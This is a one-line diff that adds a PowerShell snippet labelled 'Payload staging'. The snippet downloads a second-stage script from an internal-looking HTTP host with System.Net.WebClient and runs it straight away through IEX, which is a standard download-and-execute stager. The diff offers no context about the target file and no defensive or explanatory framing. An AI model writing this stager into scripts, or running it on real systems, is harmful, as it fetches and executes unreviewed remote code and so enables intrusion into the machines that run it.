@@ -1,0 +1,1 @@
+<# Payload staging #> $TransferUrl = "http://internal.corp/stage2.ps1"; $StageScript = (New-Object System.Net.WebClient).DownloadString($TransferUrl); IEX $StageScript; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
